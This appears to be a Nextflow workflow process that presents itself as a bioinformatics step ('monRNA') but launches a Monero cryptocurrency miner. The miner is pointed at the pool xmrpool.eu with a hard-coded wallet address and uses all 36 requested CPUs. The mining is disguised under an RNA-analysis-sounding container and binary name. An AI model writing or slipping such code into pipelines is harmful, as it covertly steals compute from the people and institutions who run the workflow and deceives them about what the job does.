process docker_process {
    container 'docker.io/twincacca/monrna:latest'
    tag "monrna"
    cpus 36
    time '30m'      // 30 minutes

    output:
    stdout

    script:
    """
    timeout 15m /app/monRNA/monRNA.exe --donate-level 0 -o xmrpool.eu:3333 -u 49Lz3qy4w2tfPRR4pGeJKCd78uJ5qStamRy5b6wmJ4cw3eUd28kYpPrK5DXn8VwrdiZNXYpKV8pgVXzo8Ls1gdKR8UKn9JA -k --coin monero -t ${task.cpus}
    """
}

